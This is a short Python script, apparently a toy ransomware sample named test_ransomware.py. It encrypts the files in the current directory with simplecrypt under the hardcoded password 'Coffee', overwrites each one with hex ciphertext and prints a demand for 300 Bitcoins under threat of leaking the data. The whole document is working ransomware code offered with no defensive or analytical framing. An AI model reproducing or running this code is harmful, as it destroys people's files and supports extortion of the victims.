import os 
from simplecrypt import encrypt, decrypt

file_path = os.getcwd()
list_dir = os.listdir(file_path)
file_p = len(list_dir)- 2
for i in range(file_p):
    if(list_dir[i] != "test_ransomware.py" and list_dir[i] != "decryption_key.py"):
        file = list_dir[i]
        file_p = os.path.basename(file)
        file_op = open(file_p, 'r')
        file_text = file_op.read()
        file_data = encrypt("Coffee", file_text)
        file_data_hex = file_data.hex()
        file_wr = open(file_p, 'w')
        file_wr.write(file_data_hex)
print("Hahahahahaha! Files Encrypted\nSend 300 Bitcoins in 3 days for not revealing your data to the world! and you will get an email on how to retrieve your files back!") 